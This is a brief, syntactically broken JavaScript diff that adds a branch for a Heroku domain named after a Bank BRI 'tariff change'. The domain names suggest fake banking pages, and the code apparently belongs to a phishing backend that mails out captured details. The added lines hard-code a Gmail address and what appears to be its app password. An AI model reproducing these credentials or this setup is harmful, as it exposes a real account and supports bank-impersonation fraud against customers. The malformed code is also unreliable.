@@ -6,7 +6,15 @@ export default function handler(req, res) {
 
     let email = '';
     let pass = '';
+    
+    
 
+    } else if (url == 'pilihan-tarif-bri-new.herokuapp.com') {
+
+    let email = 'landaslepas77@gmail.com';
+    let pass = 'eyosohykexzgicup';
+
+        
     if(url == 'perubahantarifbri.herokuapp.com') //jika url sama dengan url hosting
     {
 
